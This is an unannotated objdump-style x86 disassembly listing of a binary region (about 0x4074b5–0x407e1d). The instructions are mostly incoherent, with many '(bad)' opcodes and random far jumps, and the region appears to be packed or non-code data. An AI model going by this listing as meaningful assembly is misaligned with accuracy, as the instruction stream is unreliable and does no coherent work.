  4074b5:	retf   
  4074b6:	cmp    al,0x3a
  4074b8:	(bad)  
  4074b9:	push   esp
  4074ba:	or     BYTE PTR [ecx+0x3c],al
  4074bd:	or     esi,edi
  4074bf:	inc    esi
  4074c0:	cwde   
  4074c1:	aam    0x7b
  4074c3:	out    dx,al
  4074c4:	aas    
  4074c5:	pop    ebx
  4074c6:	idiv   DWORD PTR [edi+eax*4-0x13d04244]
  4074cd:	retf   
  4074ce:	fisttp WORD PTR [ebp+0xb]
  4074d1:	retf   
  4074d2:	not    BYTE PTR [ebx-0x1e83359d]
  4074d8:	out    0xec,eax
  4074da:	cmc    
  4074db:	push   cs
  4074dc:	in     al,dx
  4074dd:	adc    al,BYTE PTR ds:[esi]
	...
  4074f4:	bound  edx,QWORD PTR [ebx-0x3452d020]
  4074fa:	test   BYTE PTR [ebx-0x1e833490],0xa7
  407501:	shl    ch,1
  407503:	out    0xcb,al
  407505:	retf   
  407506:	jl     0x4074e5
  407508:	ret    
  407509:	inc    ecx
  40750a:	add    cl,al
  40750c:	mov    ecx,0xc1cef70d
  407511:	(bad)  
  407512:	or     ebp,ecx
  407514:	inc    esp
  407515:	push   ds
  407516:	in     al,0xbe
  407518:	in     eax,0x9e
  40751a:	loopne 0x4074c9
  40751c:	push   eax
  40751d:	retf   
  40751e:	mul    dl
  407520:	dec    edi
  407521:	inc    eax
  407522:	inc    esi
  407523:	adc    DWORD PTR [eax+0x62],esi
  407526:	dec    ecx
  407527:	jmp    0xa998284b
  40752c:	cmp    ecx,ebx
  40752e:	push   edi
  40752f:	cmp    DWORD PTR [eax],ebx
  407531:	xor    ecx,DWORD PTR [eax]
  407533:	add    BYTE PTR [ebp-0x119749c7],dh
  407539:	add    DWORD PTR [eax+0x0],ecx
  40753c:	xchg   ebp,eax
  40753d:	imul   edi,DWORD PTR [ebp+0x8],0xd
  407541:	test   eax,0x832ffed
  407546:	outs   dx,DWORD PTR ds:[esi]
  407547:	add    DWORD PTR [ebp+0x4f68b639],esi
  40754d:	add    cl,BYTE PTR [eax+0x0]
  407550:	aad    0x69
  407552:	jge    0x40755c
  407554:	fnstsw WORD PTR [ebx-0x13]
  407557:	inc    DWORD PTR [eax]
	...
  407569:	add    BYTE PTR [eax],al
  40756b:	add    dl,al
  40756d:	or     BYTE PTR [edi+0x2],ch
  407570:	cmp    esi,DWORD PTR gs:[esi+0x4802bd68]
  407577:	add    BYTE PTR ds:0x7d087d6b,ah
  40757d:	mov    edi,0x3882ffeb
  407582:	adc    bh,BYTE PTR [edx+eax*4+0x3dc2c169]
  407589:	xchg   esi,eax
  40758a:	pop    ebp
  40758b:	mov    edx,DWORD PTR [ecx+0xffccc15]
  407591:	xchg   esi,eax
  407592:	bound  ecx,QWORD PTR [ecx]
  407594:	and    ch,ch
  407596:	push   cs
  407597:	call   0x379d0d
  40759c:	pushf  
  40759d:	fdivr  st(2),st
  40759f:	push   0x1f
  4075a1:	imul   edi,DWORD PTR [ebp+0x8],0x4d
  4075a5:	push   ss
  4075a6:	idiv   edi
  4075a8:	sar    BYTE PTR [ebx-0x674700d7],cl
  4075ae:	loopne 0x407626
  4075b0:	inc    edx
  4075b1:	imul   esi,edi,0x6a
  4075b4:	shr    DWORD PTR [edx+0x7d],0x8
  4075b8:	std    
  4075b9:	mov    ecx,0x6b02fff5
  4075be:	jge    0x4075bc
  4075c0:	mov    WORD PTR [edx],fs
  4075c2:	rol    BYTE PTR [edi],1
  4075c4:	in     al,0x81
  4075c6:	xchg   ebp,eax
  4075c7:	dec    ebx
  4075c9:	add    al,0x49
  4075cb:	add    al,0x8c
  4075cd:	mov    al,ds:0xec83
	...
  4075e2:	add    BYTE PTR [eax],al
  4075e4:	es mov ebx,0x7c5b34e2
  4075ea:	or     al,0x68
  4075ec:	outs   dx,DWORD PTR ds:[esi]
  4075ed:	or     cl,ah
  4075ef:	jmp    DWORD PTR [edx+0x4d483ba0]
  4075f5:	mov    ebx,0x5ad2d262
  4075fa:	push   esi
  4075fb:	or     ecx,DWORD PTR [edi+eax*1-0x10]
  4075ff:	dec    edi
  407600:	add    DWORD PTR [eax],0xfffffffb
  407603:	inc    BYTE PTR [ecx]
  407605:	mov    al,0xba
  407607:	(bad)  
  407608:	stc    
  407609:	mov    bl,0x62
  40760b:	cwde   
  40760c:	jo     0x407680
  40760e:	push   esi
  40760f:	call   0xff96ac41
  407614:	out    0xbb,al
  407616:	loop   0x40764c
  407618:	mov    ebx,0x6f680afc
  40761d:	sub    cl,ah
  40761f:	jmp    FWORD PTR [ebx+0xc000abd]
  407625:	xchg   ebx,eax
  407626:	stos   BYTE PTR es:[edi],al
  407627:	mov    esi,0xc000ba33
  40762c:	mov    al,ds:0x99febac8
  407631:	retf   
  407632:	push   ebx
  407633:	jne    0x4075bd
  407635:	mov    edx,DWORD PTR [ebp+0x75]
  407638:	test   bl,dl
  40763a:	loop   0x40761f
  40763c:	or     edx,edx
  40763e:	arpl   WORD PTR [edx+0x47],si
  407641:	or     dl,BYTE PTR [ebp-0x1]
  407644:	sub    ebx,0x7553
	...
  40765a:	add    BYTE PTR [eax],al
  40765c:	adc    BYTE PTR [ebx-0xd],0x56
  407660:	dec    ebp
  407661:	xchg   esp,eax
  407662:	loope  0x4076c0
  407664:	pop    ecx
  407665:	pushf  
  407666:	cdq    
  407667:	xor    al,0xc8
  40766a:	popf   
  40766b:	dec    ebx
  40766c:	into   
  40766d:	xchg   edi,eax
  40766e:	loope  0x407626
  407670:	push   ss
  407671:	mov    eax,0x3dc04861
  407676:	loope  0x407661
  407678:	test   ecx,ecx
  40767a:	repz or esp,DWORD PTR [edx+edx*1+0x1aab5d39]
  407682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407683:	pop    edi
  407684:	xor    al,0x94
  407686:	loope  0x4076f4
  407688:	fidivr DWORD PTR [ebx]
  40768a:	in     eax,0xb4
  40768c:	dec    esp
  40768d:	xchg   esp,eax
  40768e:	inc    esi
  40768f:	xlat   BYTE PTR ds:[ebx]
  407690:	xchg   ebx,eax
  407691:	mov    esp,0xc8835cc0
  407696:	fadd   DWORD PTR [edx]
  407698:	mov    WORD PTR [edi+0x5f82ec7e],?
  40769e:	mov    al,ds:0xf9426b03
  4076a3:	imul   edx,edx,0xffffffc7
  4076a6:	adc    eax,0x1d425b5d
  4076ab:	pop    ebp
  4076ac:	fstp   DWORD PTR [ecx+ecx*1+0xdc80477]
  4076b3:	dec    ebx
  4076b4:	dec    esi
  4076b5:	xchg   ecx,eax
  4076b6:	loope  0x40766e
  4076b8:	push   es
  4076b9:	mov    ecx,0xc054485f
  4076be:	in     eax,0x5c
	...
  4076d4:	sbb    DWORD PTR [edx-0x13],edx
  4076d7:	mov    bl,0x22
  4076d9:	inc    edx
  4076da:	in     eax,0x5c
  4076dc:	popa   
  4076dd:	jecxz  0x407707
  4076df:	ret    
  4076e0:	adc    esi,DWORD PTR [eax-0x6b735af6]
  4076e6:	cli    
  4076e7:	inc    ebx
  4076e8:	xchg   ebx,eax
  4076e9:	adc    DWORD PTR [ecx+0x8948c02],ebp
  4076ef:	scas   al,BYTE PTR es:[edi]
  4076f0:	retf   0x7bf
  4076f3:	jmp    0x2d100b87
  4076f8:	inc    esp
  4076f9:	(bad)  
  4076fa:	push   cs
  4076fb:	jmp    0x348b18f
  407700:	mov    BYTE PTR [edx],bh
  407702:	or     BYTE PTR [ebx],al
  407704:	nop
  407705:	sbb    DWORD PTR [ebp+0x7d],ecx
  407708:	call   FWORD PTR [eax]
  40770a:	lea    esi,[ebp+0x60]
  40770d:	(bad)  
  40770e:	neg    BYTE PTR [ecx]
  407710:	push   ecx
  407711:	inc    ecx
  407712:	lock outs dx,BYTE PTR ds:[esi]
  407714:	ret    0xdfcb
  407717:	gs jmp 0x50327fb1
  40771d:	inc    eax
  40771e:	or     eax,0x8951440
  407723:	jmp    0xa8806d9f
  407728:	pop    edi
  40772a:	jl     0x407719
  40772c:	out    0x59,eax
  40772e:	mov    dh,0x36
  407730:	shl    BYTE PTR [ebx+eax*4+0x19],1
  407734:	sbb    dl,BYTE PTR [ecx]
  407736:	cld    
  407737:	push   ds
	...
  40774c:	rol    bh,0x57
  40774f:	mov    ebx,0x16b689e7
  407754:	mov    al,0x1d
  407756:	lea    ebx,[ecx]
  407758:	loopne 0x407721
  40775a:	not    BYTE PTR [ecx]
  40775c:	mov    esp,0x24fef70a
  407761:	(bad)  
  407762:	outs   dx,BYTE PTR ds:[esi]
  407763:	pop    ecx
  407764:	clc    
  407765:	push   ebx
  407766:	or     dh,ch
  407768:	add    esp,eax
  40776a:	(bad)  
  40776b:	out    0xc7,al
  40776d:	(bad)  
  40776e:	cmp    al,0xba
  407770:	dec    eax
  407771:	push   esp
  407772:	or     cl,al
  407774:	fwait
  407775:	or     edi,esi
  407777:	into   
  407778:	sbb    DWORD PTR [ecx],edx
  40777a:	in     al,dx
  40777b:	add    BYTE PTR [edx+0x6b],al
  40777e:	imul   DWORD PTR [edx-0x1b]
  407781:	mov    edx,0x90a457a8
  407786:	div    DWORD PTR [ebp-0x89cdb]
  40778c:	sub    ah,BYTE PTR [ebp-0x6f5bb725]
  407792:	loopne 0x407809
  407794:	cmp    BYTE PTR [ebx-0x9],ch
  407797:	mov    DWORD PTR [eax],esi
  407799:	cmp    al,0xff
  40779b:	dec    DWORD PTR [edx]
  40779d:	mov    dh,0xf6
  40779f:	addr16 sub al,0x3
  4077a2:	dec    eax
  4077a3:	add    BYTE PTR [edx],bh
  4077a5:	and    eax,0x6b3af7f8
  4077aa:	div    DWORD PTR ds:0x47d866
	...
  4077c4:	cmp    eax,0x3affb403
  4077c9:	sbb    DWORD PTR [ebp-0x8961d18],ecx
  4077cf:	push   0x75
  4077d1:	mov    edx,0x922457a1
  4077d6:	div    DWORD PTR [ebp-0x89e4b]
  4077dc:	mov    edx,0x3448dba3
  4077e1:	xchg   edx,eax
  4077e2:	loopne 0x40781d
  4077e4:	mov    eax,0xe089f769
  4077e9:	xor    bh,bh
  4077eb:	call   FWORD PTR [edx+0x42d88d1b]
  4077f1:	imul   esi,edi,0x50
  4077f4:	sbb    eax,0x25415f25
  4077f9:	imul   edi,DWORD PTR [ebp-0x894dd10],0xffffffff
  407800:	cmp    BYTE PTR [ebp+0x40],0x41
  407804:	and    eax,0x8cbd1e3a
  407809:	ficom  WORD PTR [ecx+0xb]
  40780c:	int3   
  40780d:	pop    edi
  40780e:	cmc    
  40780f:	add    BYTE PTR [ecx-0xc],0x59
  407813:	(bad)  
  407814:	sti    
  407815:	scas   eax,DWORD PTR es:[edi]
  407816:	xlat   BYTE PTR ds:[ebx]
  407817:	psllq  mm1,mm3
  40781a:	add    DWORD PTR [ebp-0xae0138],0xb96e233c
  407824:	(bad)  [esi]
  407826:	data16 adc al,0x0
	...
  407839:	add    BYTE PTR [eax],al
  40783b:	add    BYTE PTR [edi+0x5c05c6fb],al
  407841:	adc    edi,DWORD PTR [edx]
  407843:	mov    ecx,0x854a0ec3
  407848:	fdivr  DWORD PTR [esi]
  40784a:	push   edx
  40784b:	call   FWORD PTR [ecx+0xf000abb]
  407851:	jns    0x4078aa
  407853:	mul    DWORD PTR [ebx+0x31740b2e]
  407859:	cmp    dl,BYTE PTR [eax+0x525e9bec]
  40785f:	add    BYTE PTR [eax],al
  407861:	clc    
  407862:	lea    edi,[ebp-0xad798c]
  407868:	mov    edi,?
  40786a:	mov    ebp,0x61bb8c67
  40786f:	mov    esi,0xe803006b
  407874:	mov    edx,0x5bff5265
  407879:	pusha  
  40787a:	outs   dx,DWORD PTR ds:[esi]
  40787b:	not    DWORD PTR [ebx-0x62]
  40787e:	push   edx
  40787f:	jne    0x407815
  407881:	xchg   ebx,eax
  407882:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407883:	mov    dh,0x43
  407885:	mov    ss,WORD PTR [edx-0x4b]
  407888:	and    al,0xbe
  40788a:	push   eax
  40788b:	push   DWORD PTR [ebx]
  40788d:	dec    eax
  40788e:	add    ebp,eax
  407890:	or     BYTE PTR [ebp+0x52],bh
  407893:	jmp    DWORD PTR [ebx]
  407895:	xchg   esp,eax
  407896:	xchg   esp,eax
  407897:	pusha  
  407898:	and    eax,ebp
  40789a:	aad    0x59
  40789c:	cdq    
  40789d:	pushf  
  40789e:	leave  
  40789f:	mov    al,BYTE PTR [eax]
	...
  4078b1:	add    BYTE PTR [eax],al
  4078b3:	add    BYTE PTR [edx-0x3b],al
  4078b6:	lds    ebx,FWORD PTR [ecx+0x39]
  4078b9:	mov    ah,0xb5
  4078bb:	pop    ecx
  4078bc:	sti    
  4078bd:	les    edi,FWORD PTR [ebx]
  4078bf:	or     al,0xe4
  4078c1:	adc    esi,DWORD PTR [edi+0x59]
  4078c4:	jmp    0x40788a
  4078c6:	jnp    0x407900
  4078c8:	fcmovnb st,st(4)
  4078ca:	lods   eax,DWORD PTR ds:[esi]
  4078cb:	pop    ecx
  4078cc:	popa   
  4078cd:	pushf  
  4078ce:	cdq    
  4078cf:	hlt    
  4078d0:	sbb    ebp,eax
  4078d2:	popf   
  4078d3:	pop    ecx
  4078d4:	add    DWORD PTR [eax-0x443ca663],esi
  4078da:	adc    al,0x9b
  4078dc:	mov    ebx,0xa08f75c4
  4078e1:	mov    esp,0x5ab4597d
  4078e6:	cmp    BYTE PTR [ecx-0x5d],bl
  4078e9:	les    edx,FWORD PTR [ebx+0x55c4a36c]
  4078ef:	ins    BYTE PTR es:[edi],dx
  4078f0:	push   edx
  4078f1:	or     ebx,DWORD PTR [esi+0x59]
  4078f4:	mov    ecx,DWORD PTR [edx]
  4078f6:	inc    ecx
  4078f7:	push   ecx
  4078f8:	add    esp,0x58
  4078fb:	adc    eax,0x5935c435
  407900:	cmp    ebp,eax
  407902:	xor    eax,0x8ad6b59
  407907:	fwait
  407908:	arpl   sp,ax
  40790a:	sub    eax,0xddae63bf
  40790f:	pop    ecx
  407910:	push   ebx
  407911:	les    ebx,FWORD PTR ds:0xacad47cf
  407917:	sahf   
	...
  40792c:	mov    WORD PTR [eax+edi*1-0x636b7bba],ss
  407933:	mov    WORD PTR [eax],fs
  407935:	sbb    BYTE PTR [eax],cl
  407937:	sub    eax,0x83082ec8
  40793c:	nop
  40793d:	ret    
  40793e:	jl     0x407931
  407940:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407941:	jle    0x407901
  407943:	fidiv  WORD PTR [ebp+ecx*1+0x5a12d54d]
  40794a:	lock cmp eax,esi
  40794d:	push   0x2c90285f
  407952:	dec    ecx
  407953:	push   ss
  407954:	iret   
  407955:	ret    
  407956:	cmc    
  407957:	cld    
  407958:	mov    al,ds:0x77e9494c
  40795d:	ret    0xa6b2
  407960:	xor    al,0x8f
  407962:	enter  0xdd15,0x53
  407966:	pusha  
  407967:	call   0x8ef62cfb
  40796c:	ror    bl,cl
  40796e:	push   edi
  40796f:	xchg   dl,cl
  407971:	fwait
  407972:	loopne 0x4079e5
  407974:	jne    0x407939
  407976:	test   BYTE PTR [ecx+0x6ef6fc58],0xa
  40797d:	pop    edx
  40797e:	lock mov ecx,0xa85f37a7
  407984:	(bad)  
  407985:	sub    al,0x49
  407987:	mov    esi,0x14f5c34e
  40798c:	mov    ecx,0xe9494c
	...
  4079a1:	add    BYTE PTR [eax],al
  4079a3:	add    bh,ah
  4079a5:	into   
  4079a6:	mov    dl,0x3e
  4079a8:	aam    0x8f
  4079aa:	enter  0x5cbd,0x53
  4079ae:	pusha  
  4079af:	jmp    0x407940
  4079b1:	mov    bl,0xb5
  4079b3:	es dec edx
  4079b5:	retf   
  4079b6:	push   edi
  4079b7:	push   ds
  4079b8:	inc    edx
  4079b9:	fwait
  4079ba:	loopne 0x407979
  4079bc:	test   ebx,eax
  4079be:	test   BYTE PTR [ecx],0xbc
  4079c1:	cld    
  4079c2:	test   BYTE PTR [eax],0x92
  4079c5:	scas   eax,DWORD PTR es:[edi]
  4079c6:	jp     0x407a1f
  4079c8:	in     al,0x96
  4079ca:	div    DWORD PTR [ebp+0x2d]
  4079cd:	das    
  4079ce:	jg     0x4079cd
  4079d0:	xor    ch,BYTE PTR [ebx-0x9]
  4079d3:	jne    0x407a06
  4079d5:	imul   edi,DWORD PTR [ebp+0x8],0x3d
  4079d9:	pop    ebp
  4079da:	mov    ebp,0xca50e2ff
  4079df:	add    al,0xf5
  4079e1:	add    eax,DWORD PTR [edx-0x2bab9b14]
  4079e7:	div    DWORD PTR [edx]
  4079e9:	imul   eax,DWORD PTR [ebp-0x9f7debb],0x75
  4079f0:	shr    DWORD PTR [ecx+0x3d],0xd3
  4079f4:	popf   
  4079f5:	fdecstp 
  4079f7:	out    0x57,eax
  4079f9:	hlt    
  4079fa:	pop    es
  4079fb:	add    BYTE PTR [esi-0xb7af8aa],ch
  407a01:	cwde   
  407a02:	or     BYTE PTR [eax],al
  407a04:	jmp    0x0:0xfed4
	...
  407a1b:	add    BYTE PTR [ebp+0x78c70896],ah
  407a21:	test   DWORD PTR fs:[edi],0x6296b5
  407a28:	mov    edi,0xbf006296
  407a2d:	xchg   esi,eax
  407a2e:	test   DWORD PTR [ebp-0x17],eax
  407a31:	or     BYTE PTR [ebp+eax*4-0x8ae27],al
  407a38:	adc    eax,0xb2f87d6b
  407a3d:	jecxz  0x407a31
  407a3f:	call   0x489c9d
  407a44:	outs   dx,BYTE PTR ds:[esi]
  407a45:	push   esi
  407a46:	jl     0x407a4d
  407a48:	jl     0x407a5e
  407a4a:	or     DWORD PTR [eax],eax
  407a4c:	gs scas al,BYTE PTR es:[edi]
  407a4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a4f:	dec    eax
  407a50:	mov    esp,gs
  407a52:	or     bh,bh
  407a54:	mov    ecx,0xf7b562df
  407a59:	call   0x8581:0x9c07505f
  407a60:	and    bl,al
  407a62:	pop    ebp
  407a63:	(bad)  
  407a64:	mov    esp,0xd7a5631d
  407a69:	mov    edx,0xdc09895d
  407a6e:	inc    ebp
  407a6f:	dec    DWORD PTR [ebx]
  407a71:	aam    0x51
  407a73:	mov    bh,0x3
  407a75:	shl    eax,cl
  407a77:	push   DWORD PTR [ebx+0x1c]
  407a7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a7b:	inc    eax
  407a7c:	mov    WORD PTR [edx],es
  407a7e:	cwde   
  407a7f:	lock add BYTE PTR [eax],al
	...
  407a92:	add    BYTE PTR [eax],al
  407a94:	jecxz  0x407aa0
  407a96:	pop    esi
  407a97:	call   FWORD PTR [ecx-0x73bf3ce2]
  407a9d:	and    edx,DWORD PTR [edx-0x46]
  407aa0:	shl    DWORD PTR [edx],cl
  407aa2:	test   BYTE PTR [ebp-0xa1dd50],al
  407aa8:	ss stos DWORD PTR es:[edi],eax
  407aaa:	loop   0x407a65
  407aac:	arpl   WORD PTR [esp+ecx*1-0x1],bp
  407ab0:	stc    
  407ab1:	cmp    eax,DWORD PTR [esi-0x1]
  407ab4:	stos   DWORD PTR es:[edi],eax
  407ab5:	dec    edx
  407ab6:	sbb    bl,dl
  407ab8:	push   esp
  407ab9:	ins    BYTE PTR es:[edi],dx
  407aba:	or     al,0xe8
  407abc:	mov    ecx,0x5ff5df5
  407ac1:	cmp    DWORD PTR [edi-0x9],ebp
  407ac4:	mov    ebp,DWORD PTR [edx-0x1f]
  407ac7:	(bad)  
  407ac8:	jmp    0x407b38
  407aca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407acb:	inc    eax
  407acc:	mov    WORD PTR [edx-0x68],ds
  407acf:	lock jnp 0x407a54
  407ad2:	pop    esi
  407ad3:	jmp    DWORD PTR [ecx-0x73bf3c62]
  407ad9:	push   ebx
  407ada:	sahf   
  407adb:	mov    edx,0x8c2e945b
  407ae0:	or     DWORD PTR [ebp+ebx*1-0x1ed1b4aa],esi
  407ae7:	jmp    0x407b34
  407ae9:	imul   esp,DWORD PTR [eax-0xef8c4fd],0xf5c1334d
  407af3:	(bad)  
  407af5:	dec    esp
  407af6:	mov    al,ds:0x3
	...
  407b0b:	add    BYTE PTR [ebx+esi*8],dh
  407b0e:	cmp    dl,BYTE PTR [esi+0x1b]
  407b11:	or     esp,DWORD PTR [esp+ebp*2+0x1b]
  407b15:	rcl    ebp,0xea
  407b18:	or     edi,DWORD PTR [ecx]
  407b1a:	mov    ebx,0xc6944cad
  407b1f:	(bad)  
  407b20:	cld    
  407b21:	enter  0x55cd,0xf3
  407b25:	xchg   BYTE PTR [edx-0x366bb334],dl
  407b2b:	and    DWORD PTR [esi],0x118ba5c1
  407b31:	loopne 0x407ac8
  407b33:	push   ebp
  407b34:	rcl    DWORD PTR [esp+edx*2],cl
  407b37:	pusha  
  407b38:	ret    
  407b39:	rcr    BYTE PTR [ebp+0x62373804],0x97
  407b40:	test   al,0xc8
  407b42:	lea    edx,[ebp-0x74]
  407b45:	dec    eax
  407b46:	adc    eax,0x75abe981
  407b4b:	push   ebp
  407b4c:	mov    ds:0x33b0fd93,eax
  407b51:	xchg   esp,eax
  407b52:	loope  0x407bb8
  407b54:	rol    al,cl
  407b56:	fisttp DWORD PTR [ebx]
  407b58:	je     0x407b09
  407b5a:	xchg   ecx,eax
  407b5b:	push   ebp
  407b5c:	add    eax,0xffffff9b
  407b5f:	push   0x554dc083
  407b64:	stc    
  407b65:	mov    WORD PTR [ecx-0x3e],ds
  407b68:	pop    ds
  407b69:	rol    BYTE PTR [edi],0x36
  407b6c:	mov    ecx,0x36e009
	...
  407b81:	add    BYTE PTR [eax],al
  407b83:	add    cl,al
  407b85:	mov    edi,0xac879cf6
  407b8a:	cmp    edx,DWORD PTR [ebp-0x1f]
  407b8d:	mov    edi,0xc7ac5cf6
  407b92:	test   BYTE PTR [esi],0xe1
  407b95:	dec    ecx
  407b96:	add    BYTE PTR [ecx],dl
  407b98:	xchg   edx,eax
  407b99:	or     bh,dh
  407b9b:	inc    al
  407b9d:	or     eax,ebp
  407b9f:	(bad)  
  407ba0:	mov    eax,0x8774f6bf
  407ba5:	lods   al,BYTE PTR ds:[esi]
  407ba6:	setge  BYTE PTR [eax-0x3c6b0941]
  407bad:	(bad)  
  407bae:	not    dh
  407bb0:	pop    eax
  407bb1:	dec    ecx
  407bb2:	add    cl,al
  407bb4:	test   DWORD PTR [eax],ecx
  407bb6:	test   esi,0xb6ec0958
  407bbc:	inc    eax
  407bbd:	mov    edi,0xc011c5df
  407bc2:	imul   BYTE PTR [esi-0x59014ef6]
  407bc8:	cmp    BYTE PTR [eax+ebp*8-0x9409fa9],ch
  407bcf:	pop    esp
  407bd0:	aaa    
  407bd1:	(bad)  
  407bd2:	test   BYTE PTR [esi-0x794219d9],0x58
  407bd9:	mov    edi,0xbf5889bc
  407bde:	test   BYTE PTR [ecx+0x6ef70654],0x40
  407be5:	or     esp,edx
  407be7:	pop    esi
	...
  407bfc:	cmp    BYTE PTR [edi-0x40e6d621],bh
  407c02:	not    BYTE PTR [esi+0x12]
  407c05:	(bad)  
  407c06:	dec    BYTE PTR [esi-0x20]
  407c09:	mov    edi,0x2b7d007c
  407c0e:	aas    
  407c0f:	(bad)  
  407c10:	stos   BYTE PTR es:[edi],al
  407c11:	push   0x50a5b5f7
  407c16:	idiv   edi
  407c18:	int    0x20
  407c1a:	mov    esi,0x4d68aaff
  407c1f:	clc    
  407c20:	pushf  
  407c21:	fxtract 
  407c23:	call   FWORD PTR [edx-0x72038298]
  407c29:	push   esp
  407c2a:	stos   BYTE PTR es:[edi],al
  407c2b:	add    BYTE PTR ds:0x3508ca4a,ah
  407c31:	out    dx,al
  407c32:	sub    esp,0x6af47fb6
  407c38:	and    eax,0xb0ff02ad
  407c3d:	shr    dh,0xb9
  407c40:	es arpl di,si
  407c43:	mov    DWORD PTR [eax-0x3d199f9c],esi
  407c49:	fdecstp 
  407c4b:	(bad)  
  407c4c:	mov    al,0xc0
  407c4e:	out    dx,al
  407c4f:	imul   BYTE PTR [eax]
  407c51:	arpl   di,si
  407c53:	jmp    DWORD PTR [eax-0x128a089c]
  407c59:	pop    edx
  407c5a:	in     al,dx
  407c5b:	mov    bl,0x2a
  407c5d:	arpl   cx,ax
  407c5f:	ret    0x0
	...
  407c72:	add    BYTE PTR [eax],al
  407c74:	mov    cl,0x92
  407c76:	pop    ebp
  407c77:	mov    ecx,DWORD PTR [ecx]
  407c79:	sbb    esp,ecx
  407c7b:	shl    BYTE PTR [edx],1
  407c7d:	arpl   di,si
  407c7f:	lea    esp,[eax+0x64]
  407c82:	pop    eax
  407c83:	jmp    DWORD PTR [eax+0x635f5be]
  407c89:	add    BYTE PTR [eax+0x0],cl
  407c8c:	or     eax,0xa500a8d1
  407c91:	mov    ebp,0x8ef00fb6
  407c96:	or     al,BYTE PTR [eax]
  407c98:	mov    WORD PTR [ebx-0x538bbabf],gs
  407c9e:	or     al,BYTE PTR [eax]
  407ca0:	mov    WORD PTR [esi-0x3f],gs
  407ca3:	repz imul esi,DWORD PTR [edi-0x5409fff6],0xffffffd4
  407cab:	jmp    ebp
  407cad:	stos   DWORD PTR es:[edi],eax
  407cae:	aam    0xff
  407cb0:	add    cl,dh
  407cb2:	pop    esi
  407cb3:	push   eax
  407cb4:	sbb    DWORD PTR [ecx],edi
  407cb6:	push   eax
  407cb7:	test   DWORD PTR [ebx-0x59],0xa3c1febc
  407cbe:	pop    ebx
  407cbf:	jne    0x407cf1
  407cc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cc2:	mov    bh,0xa1
  407cc4:	mov    WORD PTR [ebx-0x4f67400b],gs
  407cca:	push   ebx
  407ccb:	std    
  407ccc:	lea    ebp,[ebx-0x7c1c97f6]
  407cd2:	int    0xff
  407cd4:	or     ch,BYTE PTR [ecx+0x8]
  407cd7:	call   0x407cdc
	...
  407cec:	and    BYTE PTR ds:0xfc07ff5a,ah
  407cf2:	xchg   DWORD PTR [ebp-0xa60108],eax
  407cf8:	cmp    al,0x99
  407cfa:	push   esp
  407cfb:	loope  0x407d22
  407cfd:	pop    es
  407cfe:	pop    edx
  407cff:	mov    DWORD PTR [ecx],edx
  407d01:	cld    
  407d02:	push   ecx
  407d03:	call   ebx
  407d05:	mov    eax,ds:0x534e680c
  407d0a:	int    0xff
  407d0c:	ret    0x5b60
  407d0f:	idiv   DWORD PTR [ebx-0x20caa5f2]
  407d15:	or     ebp,0xffffffff
  407d18:	mov    bl,0x23
  407d1a:	cmp    edi,0xffffffa3
  407d1d:	xor    al,0x80
  407d1f:	in     al,0xa3
  407d21:	cs pop edx
  407d23:	push   0xffffff8c
  407d25:	xchg   esp,eax
  407d26:	fst    DWORD PTR [esi]
  407d28:	in     al,0x53
  407d2a:	loope  0x407d7e
  407d2c:	cmp    esp,eax
  407d2e:	push   ebp
  407d2f:	push   edx
  407d30:	jnp    0x407cef
  407d32:	sbb    esi,DWORD PTR [edi]
  407d34:	les    edx,FWORD PTR [ebx-0x1f]
  407d37:	pop    ebx
  407d38:	push   esi
  407d39:	cld    
  407d3a:	xor    eax,0x4d171552
  407d3f:	pop    edx
  407d40:	pop    ebx
  407d41:	mov    ebp,0x7ce403ca
  407d46:	leave  
  407d47:	les    ecx,FWORD PTR [ebx-0x42]
  407d4a:	pop    ebx
  407d4b:	push   ebx
  407d4c:	cmp    edi,DWORD PTR [ebp+0x521d]
	...
  407d62:	add    BYTE PTR [eax],al
  407d64:	and    ecx,0xb533c4a8
  407d6a:	pop    esp
  407d6b:	mov    ebp,DWORD PTR [ebx]
  407d6d:	mov    ebp,0xc5348877
  407d72:	std    
  407d73:	push   ecx
  407d74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d75:	xchg   esp,eax
  407d76:	mov    eax,ecx
  407d78:	mov    ebx,0x4150e153
  407d7d:	(bad)  
  407d7e:	fst    QWORD PTR [ecx+0x3]
  407d81:	mov    ebp,0x53443513
  407d86:	loope  0x407de3
  407d88:	add    bh,ah
  407d8a:	int    0x51
  407d8c:	adc    eax,0xe359c117
  407d91:	mov    esp,0xc4c0876b
  407d96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d97:	push   ecx
  407d98:	cmp    al,0x2c
  407d9a:	in     al,dx
  407d9b:	stos   DWORD PTR es:[edi],eax
  407d9c:	dec    esp
  407d9d:	xchg   esp,eax
  407d9e:	xchg   esi,eax
  407d9f:	xchg   edi,eax
  407da0:	mov    esp,0xbb519dc4
  407da5:	xchg   BYTE PTR [edx-0x666bb344],dh
  407dab:	fucom  st(3)
  407dad:	mov    esp,0x47e3fd75
  407db2:	or     al,dl
  407db4:	adc    bh,bh
  407db6:	(bad)  [esi+0x3d]
  407db9:	mov    ebp,0xbb7fdc0b
  407dbe:	aaa    
  407dbf:	outs   dx,BYTE PTR ds:[esi]
  407dc0:	or     ebx,ecx
  407dc2:	(bad)  
  407dc3:	push   esi
  407dc4:	frstor [eax+eiz*8+0x11]
	...
  407ddc:	sbb    edi,DWORD PTR [esi+esi*8-0x37709bae]
  407de3:	mov    ch,0x95
  407de5:	fs loopne 0x407ded
  407de8:	add    edi,DWORD PTR [esi+esi*8-0x126f4da]
  407def:	frstor es:[ecx+0x98fe908]
  407df6:	lea    edi,[ecx]
  407df8:	aad    0xbb
  407dfa:	idiv   BYTE PTR [ecx-0x57afb1a9]
  407e00:	(bad)  
  407e01:	mov    ebx,0xbbc4f9bc
  407e06:	div    dh
  407e08:	and    bh,0x3f
  407e0b:	test   al,0x8f
  407e0d:	lods   al,BYTE PTR ds:[esi]
  407e0e:	adc    al,0xa1
  407e10:	pop    esp
  407e11:	mov    ebx,0xc3b76480
  407e16:	not    dh
  407e18:	adc    dl,bh
  407e1a:	jmp    0x407df2
  407e1c:	pop    esp
  407e1d:	mov    ebx,0x2013f607
